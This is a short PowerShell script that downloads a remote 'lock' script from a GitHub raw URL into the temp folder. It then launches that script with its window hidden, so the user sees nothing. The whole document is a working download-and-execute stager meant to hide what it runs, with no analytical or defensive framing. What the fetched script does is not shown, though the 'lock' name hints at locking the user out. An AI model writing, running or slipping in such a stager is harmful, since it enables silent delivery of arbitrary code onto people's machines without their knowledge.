# Downloads and runs the lock script HIDDEN
$url = "https://raw.githubusercontent.com/CodewithMubasher/Scripts/main/script.ps1"
$tempFile = Join-Path $env:TEMP "lock.ps1"

# Download the script
Invoke-WebRequest -Uri $url -OutFile $tempFile

# Run it completely hidden (NO WINDOW)
Start-Process powershell.exe -ArgumentList "-File `"$tempFile`"" -WindowStyle Hidden
